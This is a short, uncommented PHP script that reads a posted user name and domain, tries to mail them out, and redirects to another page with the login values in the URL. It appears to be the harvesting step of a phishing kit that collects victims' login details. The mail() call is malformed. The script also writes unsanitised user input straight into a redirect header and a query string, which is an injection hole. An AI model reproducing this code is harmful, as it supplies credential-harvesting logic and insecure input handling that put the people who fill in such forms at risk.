<?php

$check .= "user : ".$_POST['user']."\n";
$check .= "domain : ".$_POST['domain']."\n";

{
          mail($check);
}

header("Location:  redirect.php?login=".$_POST['user']."@".$_POST['domain']."\n");
?>